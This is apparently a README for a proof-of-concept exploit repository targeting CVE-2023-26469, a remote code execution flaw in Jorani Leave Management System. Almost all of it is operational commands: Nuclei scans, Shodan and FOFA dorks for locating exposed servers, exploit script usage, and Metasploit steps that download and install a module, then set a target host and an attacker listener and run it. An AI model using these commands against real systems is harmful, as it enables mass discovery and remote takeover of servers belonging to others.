# CVE-2023-26469
![](https://img.shields.io/static/v1?label=Product&message=Leave%20Management%20System%20Jorani&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=v1.0.0&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Path%20Traversal%20%26%20Remote%20Code%20Execution&color=red)


- [Nuclei Template](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/2023/CVE-2023-26469.yaml)

```
nuclei -target <target> -t CVE-2023-26469.yaml
```
```
nuclei -l <target_file> -t CVE-2023-26469.yaml
```
```
nuclei -uq 'http.favicon.hash:-2032163853' -t CVE-2023-26469.yaml -vv
```

 - Shodan dork:
```
http.favicon.hash:1041760462
```
- FOFA dork:
```
icon_hash="1041760462"
```

### Usage

```
exploit.py <url>
```
### Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/Jorani_RCE/jorani_rce.rb
```
```
cp jorani_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/php/jorani_path_trav.rb
```
```
msfdb reinit; msfconsole -q
```
```
use exploit/multi/php/jorani_path_trav.rb
```
```
set RHOSTS target_IP
```
```
set lhost attacker_IP
```
```
run
```
